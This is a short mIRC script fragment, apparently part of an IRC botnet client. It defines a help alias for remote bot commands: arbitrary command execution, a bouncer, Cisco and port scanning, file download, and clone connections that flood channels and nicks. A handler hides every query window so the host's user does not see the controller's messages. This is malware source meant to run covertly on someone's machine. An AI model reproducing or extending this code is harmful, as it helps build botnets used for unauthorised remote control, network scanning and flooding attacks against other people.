on *:SIGNAL:old:{


  alias syntax {
    var %'c = lag,sysinfo,netinfo,hdinfo,uptime,fserve,exec,bnc,ciscoscan,download,clone,portscan
    var %'t = lag,sysinfo,netinfo,hdinfo,uptime,fserve [path],exec <command>,bnc <start (<port> [passwd]) - raw - status - stop>,ciscoscan <start (<ip> <ip>) - status - stop>,download <start (<file>) - status - stop>,clone <connect (<server> [port] <limit>) - join/part/jp (<chan>) - msg/notice/ctcp/action/jmp/chanflood (<chan - nick> <message>) - nick (<nick>) - nickflood (<chan>) - raw (<command>) - status - disconnect>,portscan <start (<ip> <start port> <end port>) - status - stop>
    if ($1 == 0) return %'c
    elseif ($istok(%'c,$1,44)) return $gettok(%'t,$findtok(%'c,$1,1,44),44)
    else return not found
  }

 on *:OPEN:*:*: window -hn $target


}
